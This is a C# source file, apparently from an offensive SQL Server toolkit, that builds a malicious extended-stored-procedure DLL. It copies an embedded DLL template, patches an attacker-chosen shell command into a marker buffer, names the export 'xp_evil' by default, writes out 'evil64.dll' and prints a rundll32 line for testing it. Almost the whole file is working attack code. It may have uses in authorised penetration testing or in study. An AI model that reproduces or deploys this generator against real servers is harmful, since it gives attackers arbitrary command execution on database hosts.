using System;
using System.IO;
using System.Text;

namespace SharpUpSQL.Attack
{
    internal static class XpDllGenerator
    {
        private static readonly byte[] TemplateBytes = XpDllTemplateData.GetTemplateBytes();

        internal static CreateSqlFileResult Generate(string command, string exportName, string outFile, Action<string> verbose)        {
            exportName = string.IsNullOrWhiteSpace(exportName) ? "xp_evil" : exportName;
            outFile = string.IsNullOrWhiteSpace(outFile) ? Path.Combine(".", "evil64.dll") : outFile;

            var template = LoadTemplateBytes();
            if (template == null || template.Length == 0)
            {
                return new CreateSqlFileResult { OutFile = outFile, Message = "XP DLL template not found." };
            }

            var commandBuffer = FindCommandBufferMarker(template);
            if (string.IsNullOrEmpty(commandBuffer))
            {
                return new CreateSqlFileResult { OutFile = outFile, Message = "XP DLL command buffer marker not found." };
            }

            var commandString = string.IsNullOrWhiteSpace(command)
                ? "echo This is a test. > c:\\temp\\test.txt && REM"
                : command + " && REM";

            if (commandString.Length > commandBuffer.Length)
            {
                return new CreateSqlFileResult { OutFile = outFile, Message = "Command is too long." };
            }

            var padding = commandBuffer.Length - commandString.Length;
            commandString = commandString + " && REM " + new string(' ', padding);
            PatchAscii(template, commandBuffer, commandString);

            const string procBuffer = "EVILEVILEVILEVILEVIL";
            if (exportName.Length > procBuffer.Length)
            {
                return new CreateSqlFileResult { OutFile = outFile, Message = "The function name is too long." };
            }

            PatchAscii(template, procBuffer, exportName);
            File.WriteAllBytes(outFile, template);

            if (verbose != null)
            {
                verbose("Creating DLL " + outFile);
                verbose(" - Exported function name: " + exportName);
                verbose(" - Exported function command: \"" + command + "\"");
                verbose(" - Manual test: rundll32 " + outFile + "," + exportName);
            }

            return new CreateSqlFileResult
            {
                OutFile = Path.GetFullPath(outFile),
                Message = "DLL written"
            };
        }

        private static byte[] LoadTemplateBytes()
        {
            var copy = new byte[TemplateBytes.Length];
            Buffer.BlockCopy(TemplateBytes, 0, copy, 0, TemplateBytes.Length);
            return copy;
        }
        private static string FindCommandBufferMarker(byte[] bytes)
        {
            var text = Encoding.ASCII.GetString(bytes);
            var start = text.IndexOf("REPLACEME!", StringComparison.Ordinal);
            if (start < 0)
            {
                return null;
            }

            var end = start;
            while (end < text.Length)
            {
                var ch = text[end];
                if (ch != 'R' && ch != 'E' && ch != 'P' && ch != 'L' && ch != 'A' && ch != 'C' && ch != 'M' && ch != '!')
                {
                    break;
                }

                end++;
            }

            return text.Substring(start, end - start);
        }

        private static void PatchAscii(byte[] bytes, string marker, string value)
        {
            var text = Encoding.ASCII.GetString(bytes);
            var index = text.IndexOf(marker, StringComparison.Ordinal);
            if (index < 0)
            {
                throw new InvalidOperationException("Could not find marker: " + marker);
            }

            var valueBytes = Encoding.UTF8.GetBytes(value);
            for (var i = 0; i < valueBytes.Length; i++)
            {
                bytes[index + i] = valueBytes[i];
            }
        }
    }
}
